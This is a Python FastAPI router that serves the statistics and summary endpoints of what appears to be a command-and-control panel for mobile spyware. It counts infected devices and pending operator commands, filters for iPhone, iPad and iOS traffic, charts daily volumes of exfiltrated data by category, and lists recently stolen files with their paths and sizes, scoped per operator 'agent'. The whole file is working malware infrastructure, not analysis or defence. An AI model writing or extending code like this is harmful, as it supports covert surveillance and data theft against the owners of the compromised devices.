from fastapi import APIRouter, Depends
from sqlalchemy.orm import Session
from sqlalchemy import func, and_
from datetime import datetime, timedelta
from typing import List

from ..database import get_db, Log, Device, ExfilData, Command
from ..auth import get_current_user
from ..config_constants import cfg_int
from ._helpers import (
    apply_agent_filter_device, apply_agent_filter_exfil, apply_agent_filter_command,
    _resolve_agent_scope,
)

router = APIRouter(prefix="/api/dashboard", tags=["dashboard"], redirect_slashes=False)


def _apply_log_agent_filter(query, db, user):
    scope, aid = _resolve_agent_scope(db, user)
    if scope == "admin" or aid is None:
        return query
    return query.join(Device, Log.device_uuid == Device.device_uuid).filter(Device.agent_id == aid)


@router.get("/stats")
async def dashboard_stats(
    days: int = 7,
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    now = datetime.now()
    today = now.date()
    today_start = datetime.combine(today, datetime.min.time())
    try:
        days = int(days or 7)
        if days < 1:
            days = 7
        max_days = max(1, int(cfg_int(db, "auth.dashboard_max_days")))
        if days > max_days:
            days = max_days
    except Exception:
        days = 7
        max_days = 90

    log_q = _apply_log_agent_filter(db.query(Log), db, current_user)
    dev_q = apply_agent_filter_device(db.query(Device), db, current_user)
    exfil_q = apply_agent_filter_exfil(db.query(ExfilData), db, current_user)
    cmd_q = apply_agent_filter_command(db.query(Command), db, current_user)

    total_requests = log_q.count() or 0
    total_devices = dev_q.count() or 0
    total_exfil = exfil_q.count() or 0
    active_minutes = max(1, int(cfg_int(db, "auth.active_device_minutes")))
    active_cutoff = now - timedelta(minutes=active_minutes)
    active_devices = dev_q.filter(Device.last_seen >= active_cutoff).count() or 0
    pending_commands = cmd_q.filter(Command.status == "pending").count() or 0
    ios_logs = log_q.filter(Log.user_agent.like("%iPhone%") | Log.user_agent.like("%iPad%") | Log.user_agent.like("%iOS%")).count() or 0
    today_requests = log_q.filter(Log.timestamp >= today_start).count() or 0
    today_exfil = exfil_q.filter(ExfilData.uploaded_at >= today_start).count() or 0

    request_trend: List[int] = []
    exfil_trend: List[int] = []
    device_trend: List[int] = []
    trend_dates: List[str] = []
    for i in range(days - 1, -1, -1):
        d = today - timedelta(days=i)
        s = datetime.combine(d, datetime.min.time())
        e = s + timedelta(days=1)
        rc = log_q.filter(and_(Log.timestamp >= s, Log.timestamp < e)).count() or 0
        ec = exfil_q.filter(and_(ExfilData.uploaded_at >= s, ExfilData.uploaded_at < e)).count() or 0
        dc = dev_q.filter(and_(Device.first_seen >= s, Device.first_seen < e)).count() or 0
        request_trend.append(int(rc))
        exfil_trend.append(int(ec))
        device_trend.append(int(dc))
        trend_dates.append(f"{d.month}/{d.day}")

    exfil_breakdown_rows = exfil_q.with_entities(
        ExfilData.category, func.count(ExfilData.id)
    ).group_by(ExfilData.category).all()
    exfil_breakdown: dict = {}
    for cat, cnt in exfil_breakdown_rows:
        if cat:
            exfil_breakdown[str(cat)] = int(cnt or 0)

    return {
        "total_visits": int(total_requests),
        "total_requests": int(total_requests),
        "total_devices": int(total_devices),
        "total_exfil": int(total_exfil),
        "total_exfil_records": int(total_exfil),
        "active_devices": int(active_devices),
        "online_devices": int(active_devices),
        "pending_commands": int(pending_commands),
        "ios_logs": int(ios_logs),
        "today_requests": int(today_requests),
        "today_exfil": int(today_exfil),
        "trend_dates": trend_dates,
        "request_trend": request_trend,
        "exfil_trend": exfil_trend,
        "device_trend": device_trend,
        "exfil_breakdown": exfil_breakdown,
    }


@router.get("/summary")
async def dashboard_summary(db: Session = Depends(get_db), current_user=Depends(get_current_user)):
    dev_q = apply_agent_filter_device(db.query(Device), db, current_user)
    total_devices = dev_q.count() or 0
    active = dev_q.filter(Device.status == "active").count() or 0
    offline = dev_q.filter(Device.status == "offline").count() or 0
    by_os = dict(dev_q.with_entities(Device.os_version, func.count(Device.id)).group_by(Device.os_version).all())
    by_model = dict(dev_q.with_entities(Device.device_model, func.count(Device.id)).group_by(Device.device_model).all())

    exfil_q = apply_agent_filter_exfil(db.query(ExfilData), db, current_user)
    recent_exfil = exfil_q.order_by(ExfilData.uploaded_at.desc()).limit(10).all()
    recent = [{
        "id": e.id, "device_uuid": e.device_uuid, "category": e.category,
        "path": e.path, "file_size": e.file_size,
        "uploaded_at": e.uploaded_at.isoformat() if e.uploaded_at else None,
    } for e in recent_exfil]
    return {
        "devices": {"total": total_devices, "active": active, "offline": offline},
        "by_os_version": by_os, "by_device_model": by_model,
        "recent_exfil": recent,
    }
